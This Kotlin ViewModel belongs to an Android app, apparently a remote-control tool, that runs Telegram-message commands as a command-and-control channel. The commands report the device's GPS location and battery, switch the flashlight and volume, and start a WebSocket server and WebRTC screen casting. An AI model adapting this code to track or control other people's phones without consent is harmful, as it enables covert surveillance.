package com.c2c

import android.annotation.SuppressLint
import android.app.Application
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.hardware.camera2.CameraManager
import android.location.LocationManager
import android.media.AudioManager
import android.os.BatteryManager
import android.os.Build
import android.os.Environment
import android.widget.Toast
import androidx.compose.runtime.getValue
import androidx.compose.runtime.mutableStateListOf
import androidx.compose.runtime.mutableStateOf
import androidx.compose.runtime.setValue
import androidx.lifecycle.AndroidViewModel
import androidx.lifecycle.viewModelScope
import com.c2c.data.local.AppDatabase
import com.c2c.data.local.CommandEntity
import com.c2c.domain.CommandEngine
import com.c2c.webrtc.WebRtcManager
import io.ktor.client.HttpClient
import io.ktor.client.engine.cio.CIO
import io.ktor.websocket.Frame
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.flow.MutableStateFlow
import kotlinx.coroutines.flow.StateFlow
import kotlinx.coroutines.flow.asStateFlow
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext
import org.drinkless.tdlib.Client
import org.drinkless.tdlib.TdApi
import org.json.JSONArray
import org.json.JSONObject
import org.webrtc.MediaStream
import org.webrtc.VideoTrack
import java.io.File
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale

class CoreViewModel(application: Application) : AndroidViewModel(application) {
    
    private val appCtx = application
    private val prefs = application.getSharedPreferences("CoreConfig", Context.MODE_PRIVATE)
    
    private val database = AppDatabase.getDatabase(application)
    private val commandDao = database.commandDao()
    private val httpClient = HttpClient(CIO) { engine { requestTimeout = 65_000 } }
    
    val commandEngine = CommandEngine(application, httpClient)
    val webRtcManager = WebRtcManager(application) { sdpJsonString ->
        sendLive("webrtc_signaling", sdpJsonString)
    }

    private val _commands = MutableStateFlow<List<CommandEntity>>(emptyList())
    val commands: StateFlow<List<CommandEntity>> = _commands.asStateFlow()

    var remoteVideoTrack by mutableStateOf<VideoTrack?>(null)

    var serverLogs = mutableStateListOf<String>()
    var latestSlabTxt by mutableStateOf(ServerCore.lastStatusSlab)

    var tdLogs = mutableStateListOf<String>()
    var tgMessages = mutableStateListOf<TgMessage>()
    var tgChatName by mutableStateOf("Target Node")
    var tgChatId by mutableStateOf(0L)

    private val cameraManager = application.getSystemService(Context.CAMERA_SERVICE) as CameraManager
    private val audioManager = application.getSystemService(Context.AUDIO_SERVICE) as AudioManager
    private val locationManager = application.getSystemService(Context.LOCATION_SERVICE) as LocationManager

    var tdClient: Client? = null
    var tdAuthState by mutableStateOf(TdAuthState.CLOSED)
    var isTdLibEngineRunning by mutableStateOf(false)

    init {
        webRtcManager.initialize()
        loadLocalChatHistory()

        viewModelScope.launch(Dispatchers.IO) {
            commandDao.getAllCommands().collect { list ->
                if (list.isEmpty()) seedDefaultCommands()
                else _commands.value = list
            }
        }

        viewModelScope.launch(Dispatchers.Main) {
            ServerCore.logsFlow.collect { log ->
                if (log.contains("RECV:") && log.contains("\"cmd\":\"webrtc_signaling\"")) {
                    try {
                        val wrapper = JSONObject(log.substringAfter("RECV: "))
                        val payload = JSONObject(wrapper.getString("arg"))
                        webRtcManager.handleSignalingMessage(payload)
                    } catch (e: Exception) {}
                }
                if (serverLogs.size > 150) serverLogs.removeAt(0)
                serverLogs.add(log)
                latestSlabTxt = ServerCore.lastStatusSlab
            }
        }
    }

    fun executeCommand(cmd: String, arg: String = "") {
        commandEngine.enqueue(cmd, arg)
    }

    fun addCommand(label: String, cmd: String, arg: String, icon: String) {
        viewModelScope.launch(Dispatchers.IO) {
            commandDao.insertCommand(CommandEntity(label = label, cmd = cmd, defaultArg = arg, icon = icon))
        }
    }

    fun deleteCommand(command: CommandEntity) {
        viewModelScope.launch(Dispatchers.IO) {
            commandDao.deleteCommand(command)
        }
    }

    fun initiateWebRtcConnection() {
        webRtcManager.createPeerConnection(isCaller = true) { stream ->
            if (stream.videoTracks.isNotEmpty()) {
                remoteVideoTrack = stream.videoTracks[0]
            }
        }
        executeCommand("start_webrtc", "")
    }

    fun terminateWebRtcConnection() {
        webRtcManager.peerConnection?.close()
        webRtcManager.peerConnection = null
        remoteVideoTrack = null
        sendLive("live_screen_cast", "stop")
    }

    private suspend fun seedDefaultCommands() {
        val defaults = listOf(
            CommandEntity(label = "Flash On", cmd = "flash", defaultArg = "on", icon = "flash"),
            CommandEntity(label = "Location", cmd = "loc", defaultArg = "", icon = "location"),
            CommandEntity(label = "Fetch Logs", cmd = "get_log", defaultArg = "", icon = "log"),
            CommandEntity(label = "Volume 100%", cmd = "vol", defaultArg = "100", icon = "volume_up"),
            CommandEntity(label = "Live Start", cmd = "live_start", defaultArg = "ws://0.0.0.0:8765/live", icon = "server")
        )
        defaults.forEach { commandDao.insertCommand(it) }
    }

    fun tdLog(msg: String, type: String = "INFO") {
        val time = SimpleDateFormat("HH:mm:ss.SSS", Locale.getDefault()).format(Date())
        viewModelScope.launch(Dispatchers.Main) {
            if (tdLogs.size > 1000) tdLogs.removeAt(0)
            tdLogs.add("[$time] [$type] $msg")
        }
    }

    fun dumpTdLogs(context: Context) {
        viewModelScope.launch(Dispatchers.IO) {
            try {
                val dir = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS)
                val file = File(dir, "TDLib_Diagnostic_Log_${System.currentTimeMillis()}.txt")
                file.writeText(tdLogs.joinToString("\n"))
                withContext(Dispatchers.Main) { Toast.makeText(context, "Logs dumped to Downloads folder!", Toast.LENGTH_LONG).show() }
            } catch (e: Exception) { tdLog("Dump Failed: ${e.message}", "ERROR") }
        }
    }

    private fun sendTd(query: TdApi.Function<*>, onResult: ((TdApi.Object) -> Unit)? = null) {
        try {
            tdClient?.send(query) { res ->
                if (res is TdApi.Error) tdLog("${query.javaClass.simpleName} Failed: [${res.code}] ${res.message}", "ERROR")
                else onResult?.invoke(res)
            }
        } catch (e: Exception) {
            tdLog("Exception executing ${query.javaClass.simpleName}: ${e.message}", "ERROR")
        }
    }

    fun toggleTdLib() {
        if (isTdLibEngineRunning) {
            tdLog("Initiating Engine Shutdown...", "INFO")
            sendTd(TdApi.Close()) { tdAuthState = TdAuthState.CLOSED; isTdLibEngineRunning = false; tdLog("Engine Offline", "SUCCESS") }
            tdClient = null
        } else {
            tdLog("Igniting TDLib Core Engine...", "INFO")
            isTdLibEngineRunning = true
            tdAuthState = TdAuthState.INIT
            tgMessages.clear()
            Client.execute(TdApi.SetLogVerbosityLevel().apply { newVerbosityLevel = 1 })
            tdClient = Client.create({ update -> handleTdUpdate(update) }, { e -> tdLog("JNI Exception: ${e.message}", "ERROR") }, { e -> tdLog("JNI Crash: ${e.message}", "ERROR") })
        }
    }

    private fun handleTdUpdate(update: TdApi.Object) {
        viewModelScope.launch(Dispatchers.Main) {
            when (update) {
                is TdApi.UpdateAuthorizationState -> {
                    tdLog("Auth State Shift: ${update.authorizationState.javaClass.simpleName}", "INFO")
                    when (update.authorizationState) {
                        is TdApi.AuthorizationStateWaitTdlibParameters -> {
                            val params = TdApi.SetTdlibParameters().apply {
                                useTestDc = false
                                databaseDirectory = File(appCtx.filesDir, "tdlib").absolutePath
                                useMessageDatabase = true
                                useSecretChats = true
                                apiId = prefs.getInt("tdApiId", 0)
                                apiHash = prefs.getString("tdApiHash", "")
                                systemLanguageCode = "en"
                                deviceModel = Build.MODEL
                                applicationVersion = "1.0"
                            }
                            sendTd(params)
                        }
                        is TdApi.AuthorizationStateWaitPhoneNumber -> tdAuthState = TdAuthState.WAIT_PHONE
                        is TdApi.AuthorizationStateWaitCode -> tdAuthState = TdAuthState.WAIT_CODE
                        is TdApi.AuthorizationStateWaitPassword -> tdAuthState = TdAuthState.WAIT_PASSWORD
                        is TdApi.AuthorizationStateReady -> {
                            tdAuthState = TdAuthState.READY
                            tgChatId = prefs.getLong("tdTargetChatId", 0L)
                            tdLog("Engine Authenticated. Target Chat ID: $tgChatId", "SUCCESS")
                            if (tgChatId != 0L) fetchChatHistory() else tdLog("Target Chat ID is 0. Cannot fetch history.", "WARN")
                        }
                        is TdApi.AuthorizationStateClosed -> { tdAuthState = TdAuthState.CLOSED; isTdLibEngineRunning = false }
                    }
                }
                is TdApi.UpdateConnectionState -> tdLog("Connection Matrix: ${update.state.javaClass.simpleName}", "INFO")
                is TdApi.Error -> tdLog("TDLib Internal Error: [${update.code}] ${update.message}", "ERROR")
                is TdApi.UpdateNewMessage -> {
                    val msg = update.message
                    if (msg.chatId == tgChatId) {
                        val content = msg.content
                        if (content is TdApi.MessageText) {
                            tgMessages.add(TgMessage(msg.id, content.text.text, msg.isOutgoing, msg.date * 1000L))
                            tgMessages.sortBy { it.timestamp }
                            saveLocalChatHistory()
                            tdLog("Received Message: ${content.text.text}", "INFO")
                            if (!msg.isOutgoing) executeHardwareCommand(content.text.text)
                        }
                    }
                }
            }
        }
    }

    fun tdSendPhone(phone: String) { tdLog("Submitting Phone...", "INFO"); sendTd(TdApi.SetAuthenticationPhoneNumber().apply { phoneNumber = phone }) }
    fun tdSendCode(code: String) { tdLog("Submitting OTP...", "INFO"); sendTd(TdApi.CheckAuthenticationCode().apply { this.code = code }) }
    fun tdSendPassword(pass: String) { tdLog("Submitting 2FA...", "INFO"); sendTd(TdApi.CheckAuthenticationPassword().apply { password = pass }) }

    private fun fetchChatHistory() {
        tdLog("Requesting Chat Data for ID: $tgChatId...", "INFO")
        sendTd(TdApi.LoadChats().apply { chatList = null; limit = 100 })
        sendTd(TdApi.GetChat().apply { chatId = tgChatId }) { chat -> 
            if (chat is TdApi.Chat) {
                tdLog("Chat Identity Confirmed: ${chat.title}", "SUCCESS")
                viewModelScope.launch(Dispatchers.Main) { tgChatName = chat.title } 
            }
        }
        sendTd(TdApi.GetChatHistory().apply { chatId = tgChatId; limit = 50 }) { res ->
            if (res is TdApi.Messages) {
                tdLog("History Extracted: ${res.messages.size} messages found.", "SUCCESS")
                viewModelScope.launch(Dispatchers.Main) {
                    val newMsgs = res.messages.filter { it.content is TdApi.MessageText }.map { msg ->
                        TgMessage(msg.id, (msg.content as TdApi.MessageText).text.text, msg.isOutgoing, msg.date * 1000L)
                    }
                    tgMessages.clear()
                    tgMessages.addAll(newMsgs.reversed())
                    saveLocalChatHistory()
                }
            }
        }
    }

    fun sendTelegramMessage(text: String, isMe: Boolean = true) {
        if (tgChatId == 0L || tdClient == null) {
            tdLog("Cannot send message. Engine offline or Chat ID is 0.", "ERROR")
            return
        }
        viewModelScope.launch(Dispatchers.Main) {
            tgMessages.add(TgMessage(System.currentTimeMillis(), text, isMe, System.currentTimeMillis()))
            saveLocalChatHistory()
        }
        if (isMe) {
            viewModelScope.launch(Dispatchers.IO) {
                tdLog("Dispatching Payload...", "INFO")
                val formattedText = TdApi.FormattedText().apply { this.text = text; this.entities = emptyArray() }
                val inputContent = TdApi.InputMessageText().apply { this.text = formattedText }
                val request = TdApi.SendMessage().apply { this.chatId = tgChatId; this.inputMessageContent = inputContent }
                sendTd(request) { tdLog("Payload Sent Successfully.", "SUCCESS") }
            }
        }
    }

    private fun loadLocalChatHistory() {
        try {
            val arr = JSONArray(prefs.getString("tg_history", "[]"))
            tgMessages.clear()
            for (i in 0 until arr.length()) {
                val obj = arr.getJSONObject(i)
                tgMessages.add(TgMessage(obj.getLong("id"), obj.getString("text"), obj.getBoolean("isMe"), obj.getLong("timestamp")))
            }
        } catch (e: Exception) {}
    }

    private fun saveLocalChatHistory() {
        val arr = JSONArray()
        tgMessages.forEach { msg -> arr.put(JSONObject().put("id", msg.id).put("text", msg.text).put("isMe", msg.isMe).put("timestamp", msg.timestamp)) }
        prefs.edit().putString("tg_history", arr.toString()).apply()
    }

    @SuppressLint("MissingPermission")
    private fun executeHardwareCommand(cmdString: String) {
        val parts = cmdString.split(" ")
        val cmd = parts[0].lowercase().removePrefix("/")
        val arg = if (parts.size > 1) parts[1] else ""
        viewModelScope.launch(Dispatchers.IO) {
            when (cmd) {
                "ping" -> {
                    val bat = appCtx.registerReceiver(null, IntentFilter(Intent.ACTION_BATTERY_CHANGED))?.getIntExtra(BatteryManager.EXTRA_LEVEL, -1) ?: -1
                    sendTelegramMessage("🟢 Node Online.\n🔋 Battery: $bat%")
                }
                "loc" -> {
                    sendTelegramMessage("🛰️ Fetching GPS...")
                    try {
                        val loc = locationManager.getLastKnownLocation(LocationManager.GPS_PROVIDER) ?: locationManager.getLastKnownLocation(LocationManager.NETWORK_PROVIDER)
                        if (loc != null) sendTelegramMessage("📍 <b>Location Acquired:</b>\nLat: ${loc.latitude}\nLng: ${loc.longitude}") else sendTelegramMessage("❌ Location unavailable.")
                    } catch (e: Exception) { sendTelegramMessage("❌ GPS Error") }
                }
                "flash" -> {
                    try {
                        val state = arg.lowercase() == "on"
                        cameraManager.setTorchMode(cameraManager.cameraIdList[0], state)
                        sendTelegramMessage(if (state) "🔦 Flashlight Enabled" else "🔦 Flashlight Disabled")
                    } catch (e: Exception) { sendTelegramMessage("❌ Camera Hardware Error.") }
                }
                "vol" -> {
                    val targetVol = arg.toIntOrNull() ?: 50
                    val max = audioManager.getStreamMaxVolume(AudioManager.STREAM_MUSIC)
                    audioManager.setStreamVolume(AudioManager.STREAM_MUSIC, (targetVol * max) / 100, 0)
                    sendTelegramMessage("🔊 Volume set to $targetVol%")
                }
                "live_start" -> { sendTelegramMessage("⚡ Initiating Live WebSocket..."); toggleServer(appCtx) }
                "live_stop" -> { ServerCore.ktorServer?.stop(1000, 2000); ServerCore.isRunning = false; sendTelegramMessage("🛑 Core Node Terminated.") }
            }
        }
    }

    fun sendLive(cmd: String, arg: String = "") {
        viewModelScope.launch(Dispatchers.IO) {
            if (ServerCore.liveSessions.isNotEmpty()) {
                val json = if(arg.isNotBlank()) """{"cmd":"$cmd","arg":"$arg"}""" else """{"cmd":"$cmd"}"""
                ServerCore.liveSessions.forEach { try { it.send(Frame.Text(json)) } catch(e: Exception){} }
            }
        }
    }

    fun toggleServer(context: Context) {
        val intent = Intent(context, C2ServerService::class.java).apply { putExtra("port", prefs.getInt("port", 8765)) }
        if (ServerCore.isRunning) { context.stopService(intent) } else { if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) context.startForegroundService(intent) else context.startService(intent) }
    }
}